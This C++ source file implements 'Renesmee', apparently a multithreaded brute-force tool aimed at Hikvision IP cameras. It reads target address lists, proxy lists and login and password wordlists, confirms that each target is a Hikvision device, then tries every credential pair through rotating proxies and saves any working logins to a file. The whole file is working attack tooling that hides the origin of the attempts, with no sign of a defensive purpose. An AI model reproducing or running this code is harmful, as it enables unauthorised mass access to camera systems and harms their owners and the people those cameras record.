#include "renesmee.hpp"
#include <cstddef>
#include <cstdlib>
#include <ios>
#include <iterator>
#include <mutex>
#include <stdexcept>
#include <iostream>
#include <fstream>
#include <stop_token>
#include <string>
#include <thread>
#include <utility>
#include <vector>
#include "../network/network.hpp"

Renesmee::Renesmee(
    std::string inputFile,
    std::string outputFile,
    std::string proxyFile,
    std::string loginFile,
    std::string passwordFile,
    int threadsCount
) {
    if (!checkFileExist(inputFile))
        throw std::runtime_error("File not found: " + inputFile);

    if (!checkFileExist(proxyFile))
        throw std::runtime_error("File not found: " + proxyFile);

    if (!checkFileExist(loginFile))
        throw std::runtime_error("File not found: " + loginFile);

    if (!checkFileExist(passwordFile))
        throw std::runtime_error("File not found: " + passwordFile);

    if (threadsCount <= 0)
        throw std::runtime_error("Invalid count of threads: " + std::to_string(threadsCount));

    this->inputFile = inputFile;
    this->outputFile = outputFile;
    this->proxyFile = proxyFile;
    this->loginFile = loginFile;
    this->passwordFile = passwordFile;
    this->threadsCount = threadsCount;
}

std::string Renesmee::getInputFile() {
    return this->inputFile;
}

std::string Renesmee::getOutputFile() {
    return this->outputFile;
}

std::string Renesmee::getProxyFile() {
    return this->proxyFile;
}

int Renesmee::getThreadsCount() {
    return this->threadsCount;
}

std::stop_source& Renesmee::getStopSource() {
    return this->stop_source;
}

void Renesmee::printConfiguration() {
    std::cout << "Input file: " << this->inputFile << "\n" <<
                 "Output file: " << this->outputFile << "\n" <<
                 "Proxy file: " << this->proxyFile << "\n" <<
                 "Threads count: " << this->threadsCount << std::endl;

    for (auto i = 0; i < this->inputData.size(); i++) {
        InetAddr addr = this->inputData.at(i);
        std::cout << "IP: " << addr.ip << " Port: " << addr.port << std::endl;
    }
    std::cout << std::endl << "Proxies: " << std::endl;

    for (auto i = 0; i < this->proxyData.size(); i++) {
        Proxy proxy = this->proxyData.at(i);
        std::cout << "Username: " << proxy.creds.username << " Password: " << proxy.creds.password <<
                     " IP: " << proxy.addr.ip << " Port: " << proxy.addr.port << std::endl;
    }

    for (auto i = 0; i < this->loginData.size(); i++) {
        std::cout << i + 1 << ". " << this->loginData.at(i) << std::endl;
    }

    for (auto i = 0; i < this->passwordData.size(); i++) {
        std::cout << i + 1 << ". " << this->passwordData.at(i) << std::endl;
    }
}

bool Renesmee::checkFileExist(const std::string &filename) {
    std::ifstream f(filename);
    return f.good();
}

std::pair<std::string, int> Renesmee::parseAddr(const std::string &line) {
    std::string ip;
    int port = 0;

    int colPos = line.find(':');
    if (colPos != std::string::npos) {
        port = std::atoi(line.substr(colPos + 1).c_str());
        if (port > 65535 || port < 1) port = 0;
    }

    ip = (colPos != std::string::npos) ? line.substr(0, colPos) : line;

    std::string ip_ = ip;
    int octetCount = 0;

    size_t pos;
    while ((pos = ip_.find('.')) != std::string::npos) {
        std::string octet = ip_.substr(0, pos);
        int octet_ = std::atoi(octet.c_str());

        if (0 > octet_ || octet_ > 255) return {"", 0};

        octetCount++;
        ip_ = ip_.substr(pos+ 1);
    }

    if (!ip_.empty()) {
        int octet_ = std::atoi(ip_.c_str());
        if (0 > octet_ || octet_ > 255) return {"", 0};

        octetCount++;
    }

    if (octetCount != 4) return {"", 0};

    return {ip, port};
}

int Renesmee::loadInputData() {
    std::ifstream file(this->inputFile);
    if (!file.is_open())
        throw std::runtime_error("Error open input file: " + this->inputFile);

    std::string s;
    int count{};
    while (std::getline(file, s)) {
        if (s.empty()) continue;

        auto [ip, port] = parseAddr(s);
        if (ip.empty()) continue;

        this->inputData.push_back(InetAddr{ip, port});
        count++;
    }

    return count;
}

int Renesmee::loadProxyData() {
    std::ifstream file(this->proxyFile);
    if (!file.is_open())
        throw std::runtime_error("Error open input file: " + this->proxyFile);

    std::string s;
    int count{};

    while (std::getline(file, s)) {
        if (s.empty()) continue;

        std::string username{}, password{};
        int pos = s.find('@');
        if (pos != std::string::npos) {
            int newPos = s.find(':');
            if (newPos < pos) {        
                username = s.substr(0, newPos);
                password = s.substr(newPos + 1, pos - newPos - 1);
                s = s.substr(pos + 1);
            }
        }

        auto [ip, port] = parseAddr(s);
        if (ip.empty()) continue;

        this->proxyData.push_back(Proxy{{username, password}, {ip, port}});
        count++;
    }

    return count;
}

int Renesmee::loadUsernameData() {
    std::ifstream file(this->loginFile);
    if (!file.is_open())
        throw std::runtime_error("Error open input file: " + this->loginFile);

    std::string line;
    int count{};
    while (std::getline(file, line)) {
        if (line.empty()) continue;

        this->loginData.push_back(line);
        count++;
    }

    return count;
}

int Renesmee::loadPasswordData() {
    std::ifstream file(this->passwordFile);
    if (!file.is_open())
        throw std::runtime_error("Error open input file: " + this->passwordFile);

    std::string line;
    int count{};
    while (std::getline(file, line)) {
        if (line.empty()) continue;

        this->passwordData.push_back(line);
        count++;
    }

    return count;
}

void Renesmee::brute(const InetAddr& addr, const Proxy &proxy, std::stop_token st) {
    for (const auto &login : this->loginData) { 
        for (const auto &password : this->passwordData) {
            if (st.stop_requested()) return;
            std::cout << "Address: " << addr.ip << ":" << addr.port <<
                         ". Trying combination: " + login << " " << password << std::endl;
            if (network::sendRequest(addr, proxy, login, password)) {
                std::cout << "Found valid creds: \n" <<
                "Login: " << login << '\n' <<
                "Password: " << password << std::endl;
                Output output{{login, password}, {addr.ip, addr.port}};
                this->outputData.push_back(output);
                printResult(output);
                return;
            }
        }
    }
}

void Renesmee::brute_wrapper(std::vector<InetAddr>::iterator begin_addr, std::vector<InetAddr>::iterator end_addr, Proxy proxy) {
    for (; begin_addr != end_addr; ++begin_addr) {
        // Temp solution
        if (begin_addr->port == 0) {
            std::cout << "Address does not have specified port. Skip for now..." << std::endl;
            continue;
        }

        if (!network::checkHikvision(*begin_addr)) {
            std::cout << "Address [" << begin_addr->ip << ':' << begin_addr->port << "] does not correspond to hikvision" << std::endl;
            continue;
        }

        brute(*begin_addr, proxy, stop_source.get_token());
    }
}

void Renesmee::run() {
    size_t const length = this->inputData.size();
    size_t const num_threads = std::min(
        std::min(
            std::min(
                this->inputData.size(),
                this->proxyData.size()
            ),
            (size_t)this->threadsCount
        ),
        (size_t)MAX_THREAD_COUNT
    );
    size_t const block_size = length / num_threads;
    size_t const remainder = length % num_threads;

    std::vector<std::thread> threads(num_threads);

    auto block_start = this->inputData.begin();

    size_t i{};
    for (; i < num_threads - 1; i++) {
        size_t const step = i < remainder ? block_size + 1 : block_size;
        auto block_end = block_start;
        std::advance(block_end, step);
        threads[i] = std::thread(
            &Renesmee::brute_wrapper,
            this,
            block_start,
            block_end,
            this->proxyData.at(i)
        );
        block_start = block_end;
    }

    threads[i] = std::thread(
        &Renesmee::brute_wrapper,
        this,
        block_start,
        this->inputData.end(),
        this->proxyData.at(i)
    );

    for (auto& thread : threads)
        if (thread.joinable())
            thread.join();
}

void Renesmee::printResults() {
    int i{};
    for (const auto& output : this->outputData) {
        std::cout << ++i << ". Data:\n"
                  << output.addr.ip << ":" << output.addr.port
                  << " Creds: " << output.creds.username << ":"
                  << output.creds.password << std::endl;
    }
    std::cout << "All data printed!" << std::endl;
}

void Renesmee::printResult(const Output& output) {
    std::lock_guard<std::mutex> l(mutex);
    std::ofstream file(outputFile, std::ios_base::out | std::ios_base::app);

    if (!file.is_open()) {
        std::cerr << "Unable open file " << outputFile << std::endl;
        return;
    }

    file << output.addr.ip << ':' << output.addr.port << ' ' << output.creds.username << ':' << output.creds.password << '\n';
}